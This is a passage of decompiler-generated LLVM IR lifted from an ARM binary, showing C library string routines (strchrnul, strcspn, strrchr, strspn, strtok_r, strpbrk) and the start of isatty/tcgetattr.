  uselistorder i32 %v1_10410, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_10410, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 35, 67, 36, 37, 38, 39, 40, 68, 41, 42, 43, 44, 45, 69, 46, 47, 48, 49, 50, 70, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 71 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 20, 18, 30, 19, 21, 23, 22, 31, 24, 25, 28, 26, 32, 27, 29, 33, 34, 37, 35, 38, 36, 39, 40, 41, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 24, 3, 4, 25, 5, 6, 26, 7, 8, 9, 10, 11, 12, 27, 13, 15, 14, 16, 17, 28, 18, 19, 29, 20, 21, 22, 23, 30, 31, 39, 32, 33, 40, 34, 35, 41, 36, 37, 42, 38, 43, 44, 46, 45, 47, 48, 50, 49, 51, 52, 58, 59, 53, 54, 55, 60, 56, 57, 61, 62, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 6, 1, 8, 2, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 20, 21, 22, 23, 24, 4, 25, 47, 26, 3, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 6, 2, 8, 3, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 20, 21, 22, 4, 23, 44, 24, 0, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 6, 1, 8, 2, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 22, 23, 24, 25, 4, 26, 50, 27, 3, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10880, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10814, { 2, 0, 1 }
  uselistorder label %dec_label_pc_107a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10748, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb151, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_106d4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_10698, { 1, 0 }
  uselistorder label %dec_label_pc_10684, { 1, 0 }
  uselistorder label %dec_label_pc_10644, { 2, 0, 1 }
  uselistorder label %dec_label_pc_105d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1056c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1050c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_104dc, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_10478, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_10438, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_108a4 = urem i32 %arg1, 256
  %v0_108c42 = load i32, i32* @r0, align 4
  %v1_108c43 = urem i32 %v0_108c42, 4
  %v2_108c44 = icmp eq i32 %v1_108c43, 0
  br i1 %v2_108c44, label %dec_label_pc_108cc, label %dec_label_pc_108ac

dec_label_pc_108ac:                               ; preds = %entry, %dec_label_pc_108c0
  %v0_108c0 = phi i32 [ %v1_108c0, %dec_label_pc_108c0 ], [ %v0_108c42, %entry ]
  %v1_108ac = inttoptr i32 %v0_108c0 to i8*
  %v2_108ac = load i8, i8* %v1_108ac, align 1
  %v3_108ac = zext i8 %v2_108ac to i32
  %v9_108b0 = icmp eq i32 %v3_108ac, %v1_108a4
  br i1 %v9_108b0, label %dec_label_pc_1097c, label %dec_label_pc_108b8

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108ac
  %v2_108b8 = icmp eq i8 %v2_108ac, 0
  br i1 %v2_108b8, label %dec_label_pc_1097c, label %dec_label_pc_108c0

dec_label_pc_108c0:                               ; preds = %dec_label_pc_108b8
  %v1_108c0 = add i32 %v0_108c0, 1
  %v1_108c4 = urem i32 %v1_108c0, 4
  %v2_108c4 = icmp eq i32 %v1_108c4, 0
  br i1 %v2_108c4, label %dec_label_pc_108cc, label %dec_label_pc_108ac

dec_label_pc_108cc:                               ; preds = %dec_label_pc_108c0, %entry
  %v0_108d0 = phi i32 [ %v0_108c42, %entry ], [ %v1_108c0, %dec_label_pc_108c0 ]
  %v4_108cc = mul nuw nsw i32 %v1_108a4, 256
  %v5_108cc = or i32 %v4_108cc, %v1_108a4
  %v4_108d4 = mul i32 %v5_108cc, 65536
  %v5_108d4 = or i32 %v4_108d4, %v5_108cc
  br label %dec_label_pc_108d8

dec_label_pc_108d8:                               ; preds = %dec_label_pc_10974, %dec_label_pc_10914, %dec_label_pc_108cc
  %v0_1093c = phi i32 [ %v0_108d0, %dec_label_pc_108cc ], [ %v4_108d8, %dec_label_pc_10914 ], [ %v4_108d8, %dec_label_pc_10974 ]
  %v1_108d8 = inttoptr i32 %v0_1093c to i32*
  %v2_108d8 = load i32, i32* %v1_108d8, align 4
  %v4_108d8 = add i32 %v0_1093c, 4
  %v2_108e0 = xor i32 %v2_108d8, %v5_108d4
  %v2_108e4 = add i32 %v2_108e0, 2130640639
  store i32 %v2_108e4, i32* @ip, align 4
  %v2_108ec = add i32 %v2_108d8, 2130640639
  %v1_108f0 = sub i32 -1, %v2_108d8
  %v2_108f4 = xor i32 %v2_108ec, %v1_108f0
  %v2_10900 = and i32 %v2_108f4, -2130640640
  store i32 %v2_10900, i32* @r1, align 4
  %v2_10908 = icmp eq i32 %v2_10900, 0
  br i1 %v2_10908, label %dec_label_pc_10914, label %dec_label_pc_1091c

dec_label_pc_10914:                               ; preds = %dec_label_pc_108d8
  %v1_108fc = sub i32 -1, %v2_108e0
  %v2_10904 = xor i32 %v2_108e4, %v1_108fc
  %v2_1090c = and i32 %v2_10904, -2130640640
  %v2_10914 = icmp eq i32 %v2_1090c, 0
  br i1 %v2_10914, label %dec_label_pc_108d8, label %dec_label_pc_1091c

dec_label_pc_1091c:                               ; preds = %dec_label_pc_108d8, %dec_label_pc_10914
  %v2_1091c = inttoptr i32 %v0_1093c to i8*
  %v3_1091c = load i8, i8* %v2_1091c, align 1
  %v4_1091c = zext i8 %v3_1091c to i32
  %v9_10920 = icmp eq i32 %v4_1091c, %v1_108a4
  br i1 %v9_10920, label %dec_label_pc_1097c, label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %dec_label_pc_1091c
  %v2_1092c = icmp eq i8 %v3_1091c, 0
  br i1 %v2_1092c, label %dec_label_pc_1097c, label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %dec_label_pc_1092c
  %v1_10934 = add i32 %v0_1093c, 1
  %v2_10934 = inttoptr i32 %v1_10934 to i8*
  %v3_10934 = load i8, i8* %v2_10934, align 1
  %v4_10934 = zext i8 %v3_10934 to i32
  %v9_10938 = icmp eq i32 %v4_10934, %v1_108a4
  br i1 %v9_10938, label %dec_label_pc_1097c, label %dec_label_pc_10944

dec_label_pc_10944:                               ; preds = %dec_label_pc_10934
  %v2_10944 = icmp eq i8 %v3_10934, 0
  br i1 %v2_10944, label %dec_label_pc_1097c, label %dec_label_pc_1094c

dec_label_pc_1094c:                               ; preds = %dec_label_pc_10944
  %v1_1094c = add i32 %v0_1093c, 2
  %v2_1094c = inttoptr i32 %v1_1094c to i8*
  %v3_1094c = load i8, i8* %v2_1094c, align 1
  %v4_1094c = zext i8 %v3_1094c to i32
  %v9_10950 = icmp eq i32 %v4_1094c, %v1_108a4
  br i1 %v9_10950, label %dec_label_pc_1097c, label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_1094c
  %v2_1095c = icmp eq i8 %v3_1094c, 0
  br i1 %v2_1095c, label %dec_label_pc_1097c, label %dec_label_pc_10964

dec_label_pc_10964:                               ; preds = %dec_label_pc_1095c
  %v1_10964 = add i32 %v0_1093c, 3
  %v2_10964 = inttoptr i32 %v1_10964 to i8*
  %v3_10964 = load i8, i8* %v2_10964, align 1
  %v4_10964 = zext i8 %v3_10964 to i32
  %v9_10968 = icmp eq i32 %v4_10964, %v1_108a4
  br i1 %v9_10968, label %dec_label_pc_1097c, label %dec_label_pc_10974

dec_label_pc_10974:                               ; preds = %dec_label_pc_10964
  %v2_10974 = icmp eq i8 %v3_10964, 0
  br i1 %v2_10974, label %dec_label_pc_1097c, label %dec_label_pc_108d8

dec_label_pc_1097c:                               ; preds = %dec_label_pc_108b8, %dec_label_pc_108ac, %dec_label_pc_10974, %dec_label_pc_10964, %dec_label_pc_1095c, %dec_label_pc_1094c, %dec_label_pc_10944, %dec_label_pc_10934, %dec_label_pc_1092c, %dec_label_pc_1091c
  %v1_10980 = phi i32 [ %v1_10964, %dec_label_pc_10974 ], [ %v1_10964, %dec_label_pc_10964 ], [ %v1_1094c, %dec_label_pc_1095c ], [ %v1_1094c, %dec_label_pc_1094c ], [ %v1_10934, %dec_label_pc_10944 ], [ %v1_10934, %dec_label_pc_10934 ], [ %v0_1093c, %dec_label_pc_1092c ], [ %v0_1093c, %dec_label_pc_1091c ], [ %v0_108c0, %dec_label_pc_108ac ], [ %v0_108c0, %dec_label_pc_108b8 ]
  ret i32 %v1_10980

; uselistorder directives
  uselistorder i32 %v4_108d8, { 1, 0 }
  uselistorder i32 %v2_108d8, { 0, 2, 1 }
  uselistorder i32 %v0_1093c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_108cc, { 1, 0 }
  uselistorder i32 %v1_108c0, { 1, 0, 2 }
  uselistorder i32 %v0_108c42, { 2, 1, 0 }
  uselistorder i32 %v1_108a4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1097c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1091c, { 1, 0 }
  uselistorder label %dec_label_pc_108ac, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1098c = load i32, i32* @r4, align 4
  store i32 %v3_1098c, i32* %stack_var_-16, align 4
  %v6_1098c = load i32, i32* @r5, align 4
  %v9_1098c = load i32, i32* @r6, align 4
  %v0_10990 = load i32, i32* @r0, align 4
  %v0_10994 = load i32, i32* @r1, align 4
  store i32 %v0_10994, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_109b08 = inttoptr i32 %v0_10990 to i8*
  %v2_109b09 = load i8, i8* %v1_109b08, align 1
  %v3_109b010 = zext i8 %v2_109b09 to i32
  store i32 %v3_109b010, i32* @r1, align 4
  %v2_109b411 = icmp eq i8 %v2_109b09, 0
  store i32 %v0_10994, i32* @r0, align 4
  %v1_109bc12 = add i32 %v0_10990, 1
  store i32 %v1_109bc12, i32* @r4, align 4
  br i1 %v2_109b411, label %dec_label_pc_109c4, label %dec_label_pc_109a0

dec_label_pc_109a0:                               ; preds = %entry, %dec_label_pc_109ac
  %v3_109b014 = phi i32 [ %v3_109b0, %dec_label_pc_109ac ], [ %v3_109b010, %entry ]
  %v0_109b813 = phi i32 [ %v0_109b8.pre, %dec_label_pc_109ac ], [ %v0_10994, %entry ]
  %v2_109a0 = call i32 @__GI_strchr(i32 %v0_109b813, i32 %v3_109b014)
  %v2_109a4 = icmp eq i32 %v2_109a0, 0
  %v0_109ac = load i32, i32* @r5, align 4
  br i1 %v2_109a4, label %dec_label_pc_109ac, label %dec_label_pc_109c4

dec_label_pc_109ac:                               ; preds = %dec_label_pc_109a0
  %v1_109ac = add i32 %v0_109ac, 1
  %v0_109b0.pre = load i32, i32* @r4, align 4
  %v0_109b8.pre = load i32, i32* @r6, align 4
  store i32 %v1_109ac, i32* @r5, align 4
  %v1_109b0 = inttoptr i32 %v0_109b0.pre to i8*
  %v2_109b0 = load i8, i8* %v1_109b0, align 1
  %v3_109b0 = zext i8 %v2_109b0 to i32
  store i32 %v3_109b0, i32* @r1, align 4
  %v2_109b4 = icmp eq i8 %v2_109b0, 0
  store i32 %v0_109b8.pre, i32* @r0, align 4
  %v1_109bc = add i32 %v0_109b0.pre, 1
  store i32 %v1_109bc, i32* @r4, align 4
  br i1 %v2_109b4, label %dec_label_pc_109c4, label %dec_label_pc_109a0

dec_label_pc_109c4:                               ; preds = %dec_label_pc_109ac, %dec_label_pc_109a0, %entry
  %v0_109c4 = phi i32 [ 0, %entry ], [ %v0_109ac, %dec_label_pc_109a0 ], [ %v1_109ac, %dec_label_pc_109ac ]
  %v2_109c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_109c8, i32* @r4, align 4
  store i32 %v6_1098c, i32* @r5, align 4
  store i32 %v9_1098c, i32* @r6, align 4
  ret i32 %v0_109c4

; uselistorder directives
  uselistorder i32 %v3_109b0, { 1, 0 }
  uselistorder i32 %v0_109b8.pre, { 1, 0 }
  uselistorder i32 %v0_109b0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_109a0, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_109d4 = urem i32 %arg2, 256
  store i32 %v1_109d4, i32* @r4, align 4
  %v2_109d4 = icmp eq i32 %v1_109d4, 0
  br i1 %v2_109d4, label %dec_label_pc_109e8, label %dec_label_pc_109fc.preheader

dec_label_pc_109fc.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_10a043 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_109d4)
  %v2_10a085 = icmp eq i32 %v2_10a043, 0
  br i1 %v2_10a085, label %dec_label_pc_10a10, label %dec_label_pc_109f4

dec_label_pc_109e8:                               ; preds = %entry
  %v2_109ec = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_10a14

dec_label_pc_109f4:                               ; preds = %dec_label_pc_109fc.preheader, %dec_label_pc_109f4
  %v2_10a046 = phi i32 [ %v2_10a04, %dec_label_pc_109f4 ], [ %v2_10a043, %dec_label_pc_109fc.preheader ]
  store i32 %v2_10a046, i32* @r5, align 4
  %v1_109f8 = add i32 %v2_10a046, 1
  store i32 %v1_109f8, i32* @r0, align 4
  %v0_10a00 = load i32, i32* @r4, align 4
  %v2_10a04 = call i32 @__GI_strchr(i32 %v1_109f8, i32 %v0_10a00)
  %v2_10a08 = icmp eq i32 %v2_10a04, 0
  br i1 %v2_10a08, label %dec_label_pc_10a10, label %dec_label_pc_109f4

dec_label_pc_10a10:                               ; preds = %dec_label_pc_109f4, %dec_label_pc_109fc.preheader
  %v0_10a10 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %dec_label_pc_109e8, %dec_label_pc_10a10
  %storemerge = phi i32 [ %v2_109ec, %dec_label_pc_109e8 ], [ %v0_10a10, %dec_label_pc_10a10 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10a04, { 1, 0 }
  uselistorder i32 %v1_109f8, { 1, 0 }
  uselistorder i32 %v1_109d4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10a14, { 1, 0 }
  uselistorder label %dec_label_pc_109f4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_10a502 = load i32, i32* @r0, align 4
  %v1_10a503 = inttoptr i32 %v0_10a502 to i8*
  %v2_10a504 = load i8, i8* %v1_10a503, align 1
  %v3_10a505 = zext i8 %v2_10a504 to i32
  store i32 %v3_10a505, i32* @ip, align 4
  %v2_10a546 = icmp eq i8 %v2_10a504, 0
  br i1 %v2_10a546, label %dec_label_pc_10a60, label %dec_label_pc_10a34.preheader

dec_label_pc_10a2c:                               ; preds = %dec_label_pc_10a34
  %v3_10a34 = zext i8 %v2_10a34 to i32
  %v1_10a3c = add i32 %v0_10a3c, 1
  %v9_10a2c = icmp eq i32 %v0_10a2c10, %v3_10a34
  br i1 %v9_10a2c, label %dec_label_pc_10a48, label %dec_label_pc_10a34

dec_label_pc_10a34:                               ; preds = %dec_label_pc_10a34.preheader, %dec_label_pc_10a2c
  %v0_10a3c = phi i32 [ %tmp, %dec_label_pc_10a34.preheader ], [ %v1_10a3c, %dec_label_pc_10a2c ]
  %v1_10a34 = inttoptr i32 %v0_10a3c to i8*
  %v2_10a34 = load i8, i8* %v1_10a34, align 1
  %v2_10a38 = icmp eq i8 %v2_10a34, 0
  br i1 %v2_10a38, label %dec_label_pc_10a60, label %dec_label_pc_10a2c

dec_label_pc_10a48:                               ; preds = %dec_label_pc_10a2c
  %v1_10a48 = add i32 %v0_10a48, 1
  %v1_10a4c = add i32 %v0_10a4c, 1
  %v1_10a50 = inttoptr i32 %v1_10a4c to i8*
  %v2_10a50 = load i8, i8* %v1_10a50, align 1
  %v3_10a50 = zext i8 %v2_10a50 to i32
  store i32 %v3_10a50, i32* @ip, align 4
  %v2_10a54 = icmp eq i8 %v2_10a50, 0
  br i1 %v2_10a54, label %dec_label_pc_10a60, label %dec_label_pc_10a34.preheader

dec_label_pc_10a34.preheader:                     ; preds = %entry, %dec_label_pc_10a48
  %v0_10a4c = phi i32 [ %v1_10a4c, %dec_label_pc_10a48 ], [ %v0_10a502, %entry ]
  %v0_10a48 = phi i32 [ %v1_10a48, %dec_label_pc_10a48 ], [ 0, %entry ]
  %v0_10a2c10 = phi i32 [ %v3_10a50, %dec_label_pc_10a48 ], [ %v3_10a505, %entry ]
  br label %dec_label_pc_10a34

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a48, %dec_label_pc_10a34, %entry
  %v0_10a60 = phi i32 [ 0, %entry ], [ %v0_10a48, %dec_label_pc_10a34 ], [ %v1_10a48, %dec_label_pc_10a48 ]
  ret i32 %v0_10a60

; uselistorder directives
  uselistorder i32 %v0_10a3c, { 1, 0 }
  uselistorder label %dec_label_pc_10a34.preheader, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10a6c = load i32, i32* @r4, align 4
  store i32 %v3_10a6c, i32* %stack_var_-16, align 4
  %v0_10a70 = load i32, i32* @r0, align 4
  store i32 %v0_10a70, i32* %r4.global-to-local, align 4
  %v2_10a70 = icmp eq i32 %v0_10a70, 0
  %v1_10a74 = load i32, i32* @r2, align 4
  br i1 %v2_10a70, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_10a74 = inttoptr i32 %v1_10a74 to i32*
  %v3_10a74 = load i32, i32* %v2_10a74, align 4
  store i32 %v3_10a74, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_10a78 = phi i32 [ %v3_10a74, %bb ], [ %v0_10a70, %entry ]
  store i32 %v0_10a78, i32* @r0, align 4
  store i32 %v1_10a74, i32* %r5.global-to-local, align 4
  %v0_10a80 = load i32, i32* @r1, align 4
  store i32 %v0_10a80, i32* %r6.global-to-local, align 4
  %v1_10a84 = inttoptr i32 %v0_10a78 to i8*
  %v2_10a84 = call i32 @__GI_strspn(i8* %v1_10a84)
  %v0_10a88 = load i32, i32* %r4.global-to-local, align 4
  %v2_10a88 = add i32 %v0_10a88, %v2_10a84
  %v3_10a88 = inttoptr i32 %v2_10a88 to i8*
  %v4_10a88 = load i8, i8* %v3_10a88, align 1
  %v6_10a88 = zext i8 %v4_10a88 to i32
  store i32 %v6_10a88, i32* %r3.global-to-local, align 4
  store i32 %v2_10a88, i32* @r4, align 4
  %v2_10a90 = icmp eq i8 %v4_10a88, 0
  br i1 %v2_10a90, label %bb8, label %dec_label_pc_10a9c

bb8:                                              ; preds = %entry._crit_edge
  %v2_10a94 = load i32, i32* %r5.global-to-local, align 4
  %v3_10a94 = inttoptr i32 %v2_10a94 to i32*
  store i32 %v2_10a88, i32* %v3_10a94, align 4
  br label %dec_label_pc_10ad8

dec_label_pc_10a9c:                               ; preds = %entry._crit_edge
  %v0_10a9c = load i32, i32* %r6.global-to-local, align 4
  %v3_10aa4 = call i32 @__GI_strpbrk(i8* %v3_10a88, i32 %v0_10a9c)
  %v3_10aa8 = icmp eq i32 %v3_10aa4, 0
  br i1 %v3_10aa8, label %dec_label_pc_10ab0, label %dec_label_pc_10ac8

dec_label_pc_10ab0:                               ; preds = %dec_label_pc_10a9c
  %v0_10ab4 = load i32, i32* @r4, align 4
  store i32 %v0_10ab4, i32* @r0, align 4
  %v2_10ab8 = call i32 @rawmemchr(i32 %v0_10ab4, i32 0)
  %v0_10abc = load i32, i32* @r4, align 4
  store i32 %v0_10abc, i32* %r3.global-to-local, align 4
  %v1_10ac0 = load i32, i32* %r5.global-to-local, align 4
  %v2_10ac0 = inttoptr i32 %v1_10ac0 to i32*
  store i32 %v2_10ab8, i32* %v2_10ac0, align 4
  br label %dec_label_pc_10ad8

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10a9c
  %v4_10aa4 = inttoptr i32 %v3_10aa4 to i8*
  store i8 0, i8* %v4_10aa4, align 1
  %v7_10acc = add i32 %v3_10aa4, 1
  %v1_10ad0 = load i32, i32* %r5.global-to-local, align 4
  %v2_10ad0 = inttoptr i32 %v1_10ad0 to i32*
  store i32 %v7_10acc, i32* %v2_10ad0, align 4
  %v0_10ad4 = load i32, i32* @r4, align 4
  store i32 %v0_10ad4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10ad8

dec_label_pc_10ad8:                               ; preds = %bb8, %dec_label_pc_10ab0, %dec_label_pc_10ac8
  %v0_10ad8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10adc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10adc, i32* @r4, align 4
  ret i32 %v0_10ad8

; uselistorder directives
  uselistorder i32 %v3_10aa4, { 0, 2, 1 }
  uselistorder i32 %v0_10a78, { 1, 0 }
  uselistorder i32 %v0_10a70, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10ad8, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10b10

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10afc
  %v3_10afc = zext i8 %v2_10afc to i32
  %v1_10b04 = add i32 %v0_10b04, 1
  %v1_10aec = load i32, i32* %r0.global-to-local, align 4
  %v9_10aec = icmp eq i32 %v3_10afc, %v1_10aec
  br i1 %v9_10aec, label %dec_label_pc_10af4, label %dec_label_pc_10afc

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10aec
  %v0_10af4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10af4, i32* %r0.global-to-local, align 4
  ret i32 %v0_10af4

dec_label_pc_10afc:                               ; preds = %dec_label_pc_10aec, %dec_label_pc_10b10
  %v0_10b04 = phi i32 [ %v1_10b04, %dec_label_pc_10aec ], [ %arg2, %dec_label_pc_10b10 ]
  %v1_10afc = inttoptr i32 %v0_10b04 to i8*
  %v2_10afc = load i8, i8* %v1_10afc, align 1
  %v2_10b00 = icmp eq i8 %v2_10afc, 0
  br i1 %v2_10b00, label %dec_label_pc_10b0c, label %dec_label_pc_10aec

dec_label_pc_10b0c:                               ; preds = %dec_label_pc_10afc
  %v0_10b0c = load i32, i32* %r2.global-to-local, align 4
  %v1_10b0c = add i32 %v0_10b0c, 1
  br label %dec_label_pc_10b10

dec_label_pc_10b10:                               ; preds = %entry, %dec_label_pc_10b0c
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_10b0c, %dec_label_pc_10b0c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_10b10 = inttoptr i32 %storemerge to i8*
  %v2_10b10 = load i8, i8* %v1_10b10, align 1
  %v3_10b10 = zext i8 %v2_10b10 to i32
  store i32 %v3_10b10, i32* %r0.global-to-local, align 4
  %v2_10b14 = icmp eq i8 %v2_10b10, 0
  %v0_10b18 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10b14, i32 %v0_10b18)
  br label %dec_label_pc_10afc

; uselistorder directives
  uselistorder i32 %v0_10b04, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10b10, { 1, 0 }
  uselistorder label %dec_label_pc_10afc, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_10b2c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10b2c, i32* @r1, align 4
  %v0_10b30 = call i32 @__GI_tcgetattr()
  %v1_10b34 = sub i32 1, %v0_10b30
  %v2_10b34 = icmp ult i32 %v0_10b30, 2
  br i1 %v2_10b34, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_10b44 = phi i32 [ %v1_10b34, %entry ], [ 0, %bb ]
  ret i32 %v1_10b44

; uselistorder directives
  uselistorder i32 %v0_10b30, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_10b48 = load i32, i32* @r4, align 4
  %v6_10b48 = load i32, i32* @r5, align 4
  %v9_10b48 = load i32, i32* @r6, align 4
  %v2_10b50 = ptrtoint i32* %stack_var_-52 to i32
  %v0_10b54 = load i32, i32* @r1, align 4
  store i32 %v0_10b54, i32* @r4, align 4
  store i32 %v2_10b50, i32* @r2, align 4
  store i32 21505, i32* @r1, align 4
  %v0_10b60 = call i32 @ioctl()
  store i32 %v0_10b60, i32* %r0.global-to-local, align 4
  store i32 %v0_10b60, i32* @r5, align 4
  %v2_10b64 = icmp eq i32 %v0_10b60, 0
  br i1 %v2_10b64, label %dec_label_pc_10b6c, label %dec_label_pc_10bb0

dec_label_pc_10b6c:                               ; preds = %entry
  %v4_10b78 = zext i8 %tmp to i32
  store i32 %v4_10b78, i32* @ip, align 4
  %v3_10b7c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10b7c, i32* @r3, align 4
  %v1_10b80 = load i32, i32* @r4, align 4
  %v2_10b80 = add i32 %v1_10b80, 4
  %v3_10b80 = inttoptr i32 %v2_10b80 to i32*
  %v0_10b84 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b84 = load i32, i32* @r4, align 4
  %v2_10b84 = add i32 %v1_10b84, 8
  %v3_10b84 = inttoptr i32 %v2_10b84 to i32*
  store i32 %v0_10b84, i32* %v3_10b84, align 4
  %v0_10b88 = load i32, i32* %r0.global-to-local, align 4
  %v1_10b88 = load i32, i32* @r4, align 4
  %v2_10b88 = add i32 %v1_10b88, 12
  %v3_10b88 = inttoptr i32 %v2_10b88 to i32*
  store i32 %v0_10b88, i32* %v3_10b88, align 4
  %v2_10b8c = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_10b8c, i32* @r1, align 4
  %v1_10b94 = load i32, i32* @r4, align 4
  %v2_10b94 = inttoptr i32 %v1_10b94 to i32*
  store i32 %v3_10b7c, i32* %v2_10b94, align 4
  %v0_10b98 = load i32, i32* @ip, align 4
  %v1_10b98 = trunc i32 %v0_10b98 to i8
